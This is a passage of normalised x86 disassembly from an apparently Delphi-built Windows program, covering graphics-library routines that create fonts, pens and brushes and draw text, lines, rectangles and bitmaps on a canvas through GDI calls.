lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402c80
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402a70
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_421838
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_420d7c
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42188c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_420e60
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_4218d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4184a8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_421590
xor eax eax
push ebp
push sub_42198b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_421590
xor eax eax
push ebp
push sub_42196e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420f88
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_421a0c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421975
mov eax [ ebp - 0x8 ]
call sub_4215a0
retn
mov eax ebx
call sub_421c90
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_421cac
sub_4219bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_421590
xor eax eax
push ebp
push sub_421a01
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420f10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421a08
mov eax [ ebp - 0x4 ]
call sub_4215a0
retn
sub_421a20
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_421ba9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421bb0
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403f64
retn
mov eax [ rw-data ]
call sub_420d64
xor eax eax
push ebp
push sub_421b81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_420d70
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041a4
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408ae8
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4041a4
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408ae8
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041a4
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_4080b0
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_421d04
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_421bc8
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_421784
mov edx esp
mov eax ebx
call sub_4219bc
add esp 0x2c
pop esi
pop ebx
retn
sub_421bf4
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4219a4
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4219bc
add esp 0x2c
pop esi
pop ebx
retn
sub_421c34
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4219a4
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b80
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4041dc
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402a70
mov edx esp
mov eax ebx
call sub_4219bc
sub_421cac
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call sub_4063e4
mov edx eax
neg edx
mov eax ebx
call sub_421bf4
pop esi
pop ebx
retn
sub_421cd8
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4219a4
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4219bc
add esp 0x30
pop ebx
retn
sub_421d0c
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4219a4
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_4219bc
add esp 0x2c
pop esi
pop ebx
retn
sub_421d3c
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4219a4
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_4219bc
add esp 0x2c
pop esi
pop ebx
retn
sub_421d64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_420d7c
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_421da8
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_420e60
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_421dd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4184a8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_421590
xor eax eax
push ebp
push sub_421e6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_421590
xor eax eax
push ebp
push sub_421e52
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420f88
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_421fd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421e59
mov eax [ ebp - 0x8 ]
call sub_4215a0
retn
sub_421e88
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_421ea0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_421590
xor eax eax
push ebp
push sub_421ee5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420f10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421eec
mov eax [ ebp - 0x4 ]
call sub_4215a0
retn
sub_421ef8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_421e88
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_421ea0
add esp 0x10
pop esi
pop ebx
retn
sub_421f20
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_420d64
xor eax eax
push ebp
push sub_421fa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_420d70
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_42154c
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_421fb8
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] edx
mov edx esp
call sub_421ea0
add esp 0x10
pop edi
pop esi
retn
sub_421ff4
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_421e88
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_421ea0
add esp 0x10
pop esi
pop ebx
retn
sub_422024
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_421e88
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_421ea0
sub_422050
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_420d7c
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_422090
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_420e60
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_4220b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4184a8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_421590
xor eax eax
push ebp
push sub_422148
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_421590
xor eax eax
push ebp
push sub_42212b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420f88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422132
mov eax [ ebp - 0x8 ]
call sub_4215a0
retn
sub_422160
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_42217c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_421590
xor eax eax
push ebp
push sub_4221c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420f10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4221c8
mov eax [ ebp - 0x4 ]
call sub_4215a0
retn
sub_4221cc
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_42217c
add esp 0x10
pop edi
pop esi
retn
sub_4221f8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_422160
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_42217c
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_42222c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_420d64
xor edx edx
push ebp
push sub_4222f9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_420d70
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_42154c
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_422314
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_422160
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_42217c
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_422348
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40313c
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_421838
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_422c38
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421d64
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_422c58
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422050
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_422c78
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_4181d0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42240c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_41826c
xor edx edx
mov eax esi
call sub_422a70
mov eax [ esi + 0xc ]
call sub_40316c
mov eax [ esi + 0x10 ]
call sub_40316c
mov eax [ esi + 0x14 ]
call sub_40316c
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41847c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_422468
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_422ac4
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4224f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
mov eax [ ebx + 0x14 ]
call sub_4221f0
call sub_42154c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_42154c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_416a60
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_42259c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
push esi
mov eax [ ebx + 0x4 ]
push eax
call DrawFocusRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4225d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
mov eax [ ebx + 0x14 ]
call sub_42222c
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_42260c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_42266c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_422698
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4226e0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_42271c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_4229f0
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_422748
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
mov edi [ ebx + 0x54 ]
or edi 0x4
mov eax [ ebx + 0x14 ]
call sub_42230c
cmp al 0x1
je r-xdata
test [ ebx + 0x54 ] 0x80
je r-xdata
or edi 0x2
push 0x0
mov eax esi
call sub_404200
push eax
mov eax esi
call sub_404400
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_42271c
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_42282c
inc eax
add [ ebp - 0x4 ] eax
sub_4227e8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404200
push eax
mov eax edi
call sub_404400
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_42282c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_4227e8
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_422848
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_4227e8
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_422868
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4228b4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4228bb
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_422644
sub_422914
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_422938
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_42266c
pop ecx
pop edx
pop edi
pop esi
retn
sub_422958
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_422984
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
mov eax [ ebp + 0x8 ]
call sub_42154c
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4229cc
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_422ac4
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetClipBox
pop esi
pop ebx
retn
sub_422a10
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_422a70
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
